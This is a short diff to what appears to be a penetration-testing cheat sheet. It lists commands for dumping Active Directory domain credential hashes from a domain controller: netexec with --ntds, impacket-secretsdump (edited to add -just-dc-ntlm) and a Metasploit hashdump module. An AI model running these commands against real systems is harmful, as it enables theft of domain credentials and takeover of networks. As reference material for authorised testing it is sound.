@@ -4,7 +4,7 @@
 
     netexec smb DC_IP -u USER -p PASSWORD -d DOMAIN --ntds
 
-    impacket-secretsdump 'DOMAIN/USER:PASSWORD'@IP
+    impacket-secretsdump 'DOMAIN/USER:PASSWORD'@IP -just-dc-ntlm
 
     windows/gather/credentials/domain_hashdump (Metasploit)
 
